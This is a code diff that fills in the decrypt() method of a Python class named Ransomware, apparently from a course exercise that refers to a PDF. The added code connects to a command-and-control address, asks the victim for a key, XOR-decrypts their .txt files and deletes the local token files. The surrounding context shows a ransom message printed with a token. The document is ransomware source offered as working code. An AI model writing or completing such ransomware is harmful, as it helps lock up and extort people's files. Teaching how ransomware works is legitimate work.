@@ -58,8 +58,38 @@ class Ransomware:
         print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Create an instance of SecretManager
+        secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
+
+        # Load local cryptographic elements
+        secret_manager.load()
+
+        # List all the .txt files
+        txt_files = self.get_files("*.txt")
+
+        while True:
+            try:
+                # Ask for the key
+                key = input("Enter the key to decrypt your files: ")
+
+                # Set the key
+                secret_manager.set_key(key)
+
+                # Decrypt the files using the xorfiles() method of SecretManager
+                secret_manager.xorfiles(txt_files)
+
+                # Clean the local cryptographic files
+                secret_manager.clean()
+
+                # Inform the user that the decryption was successful
+                print("Decryption successful! Your files have been restored.")
+
+                # Exit the ransomware
+                break
+            except ValueError:
+                # Inform the user that the key is invalid
+                print("Invalid key. Please try again.")
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
